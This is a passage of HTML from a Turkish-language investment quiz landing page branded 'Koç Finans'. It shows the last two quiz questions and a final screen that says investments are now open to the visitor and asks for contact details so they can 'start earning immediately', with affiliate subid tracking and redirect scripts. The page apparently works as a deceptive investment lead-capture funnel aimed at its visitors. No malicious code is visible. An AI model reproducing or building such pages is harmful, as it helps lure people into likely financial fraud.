                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 6 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="images/logo-white.png" />
                </div>
                <div
                  class="nav-menu"
                  style="display: flex; width: 50%; justify-content: flex-end"
                ></div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion"
                      >6. Herhangi bir finansal yükümlülüğünüz var mı?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="Herhangi bir finansal yükümlülüğünüz var mı?"
                      data-questionnew="6"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet, ipoteğim var"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_6"
                            value="Evet, ipoteğim var"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Evet, ipoteğim var
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet, kredim var"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_6"
                            value="Evet, kredim var"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Evet, kredim var</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="ayır, sadece ev masraflarım var"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_6"
                            value="ayır, sadece ev masraflarım var"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Hayır, sadece ev masraflarım var
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Hayır, ancak finansal olarak bağımsız olmak istiyorum"
                        data-answernew="d"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_6"
                            value="Hayır, ancak finansal olarak bağımsız olmak istiyorum"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Hayır, ancak finansal olarak bağımsız olmak
                                istiyorum
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="images/6.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>A</span><span>l</span><span>t</span
                            ><span>ı</span><span>n</span><span>c</span
                            ><span>ı</span> <span>a</span><span>d</span
                            ><span>ı</span><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 7 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="images/logo-white.png" />
                </div>
                <div
                  class="nav-menu"
                  style="display: flex; width: 50%; justify-content: flex-end"
                ></div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion"
                      >7. Koç Finans projesinden nasıl haberdar oldunuz?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="Koç Finans projesinden nasıl haberdar oldunuz?"
                      data-questionnew="7"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Açık hava reklamcılığı"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_7"
                            value="Açık hava reklamcılığı"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Açık hava reklamcılığı
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="İnternette reklam"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_7"
                            value="İnternette reklam"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">İnternette reklam</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Arkadaş önerileri ('Koç Finans' platformu katılımcıları)"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_7"
                            value="Arkadaş önerileri ('Koç Finans' platformu katılımcıları)"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Arkadaş önerileri ('Koç Finans' platformu
                                katılımcıları)
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Arama platformları"
                        data-answernew="d"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_7"
                            value="Arama platformları"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Arama platformları
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="images/7.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>Y</span><span>e</span><span>d</span
                            ><span>i</span><span>n</span><span>c</span
                            ><span>i</span> <span>a</span><span>d</span
                            ><span>ı</span><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="quiz-container quiz-container_has_results test-step">
            <div class="quiz__lead-form">
              <div class="final-page final-page_horizontal">
                <div class="final-page__content-container">
                  <div class="final-page__header-container">
                    <style>
                      .form__logo {
                        display: block;
                        max-width: 300px;
                        width: 100%;
                        margin: 0 auto 25px;
                      }

                      @media (max-width: 500px) {
                        .form__logo {
                          display: block;
                          max-width: 231px;
                          width: 100%;
                          margin: 0 auto 25px;
                        }
                      }
                    </style>
                    <img
                      src="images/logo.png"
                      class="form__logo"
                      alt="Koç Finans"
                    />

                    <div class="final-page__header">
                      Tebrikler! 'Koç Finans' platformundaki yatırımlar
                      kullanımınıza açıldı.
                    </div>
                    <div class="final-page__content">
                      <p>
                        İletişim bilgilerinizi bırakın ve hemen kazanmaya
                        başlayın.
                      </p>
                    </div>
                  </div>
                </div>
                <div class="final-page__form">
                  <div class="leadFormContainer2 firstt">
                    <div id="formRender" class="col-12">
                      <form
                        autocomplete="off"
                        class="form _main-form register-form form-reg form-send"
                        method="post"
                        id="main-form"
                      ></form>
                    </div>
                    <style>
                      .iti {
                        position: relative;
                        display: inline-block;
                        width: 100%;
                      }
                    </style>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <style>
      .commonInputDiv input {
        width: 100%;
        display: block;
        max-width: 100%;
        padding: 0 12px;
        height: 50px;
      }

      .commonInputDiv {
        width: 100%;
        max-width: 400px;
        margin: 12px auto;
      }
    </style>
    <script src="js/custom.js"></script>

    <div>
      <div class="kV5quXZxAx2jAk1eYRo10K5LdPTgcdoD"><div></div></div>
      <style>
        .kV5quXZxAx2jAk1eYRo10K5LdPTgcdoD {
          display: none;
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          z-index: 999999;
          background-color: rgba(37, 44, 51, 0.5);
        }
        .kV5quXZxAx2jAk1eYRo10K5LdPTgcdoD div {
          display: block;
          position: relative;
          left: 50%;
          top: 50%;
          width: 150px;
          height: 150px;
          margin: -75px 0 0 -75px;
          border-radius: 50%;
          border: 3px solid transparent;
          border-top-color: #00faaa;
          -webkit-animation: 2s linear infinite spin;
          animation: 2s linear infinite spin;
        }
        .kV5quXZxAx2jAk1eYRo10K5LdPTgcdoD div::before {
          position: absolute;
          content: "";
          top: 5px;
          left: 5px;
          right: 5px;
          bottom: 5px;
          border-radius: 50%;
          border: 3px solid transparent;
          border-top-color: #f70044;
          -webkit-animation: 3s linear infinite spin;
          animation: 3s linear infinite spin;
        }
        .kV5quXZxAx2jAk1eYRo10K5LdPTgcdoD div::after {
          position: absolute;
          content: "";
          top: 15px;
          left: 15px;
          right: 15px;
          bottom: 15px;
          border-radius: 50%;
          border: 3px solid transparent;
          border-top-color: #00faaa;
          -webkit-animation: 1.5s linear infinite spin;
          animation: 1.5s linear infinite spin;
        }
        @-webkit-keyframes spn {
          0% {
            -webkit-transform: rotate(0);
            -ms-transform: rotate(0);
            transform: rotate(0);
          }
          100% {
            -webkit-transform: rotate(360deg);
            -ms-transform: rotate(360deg);
            transform: rotate(360deg);
          }
        }
        @keyframes spin {
          0% {
            -webkit-transform: rotate(0);
            -ms-transform: rotate(0);
            transform: rotate(0);
          }
          100% {
            -webkit-transform: rotate(360deg);
            -ms-transform: rotate(360deg);
            transform: rotate(360deg);
          }
        }
      </style>
    </div>
    <script src="loadAssets.js?v=4564"></script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>

    <script>
      window.onload = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "confirm.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };

      window.onpageshow = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "confirm.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };
    </script>
  </body>
</html>
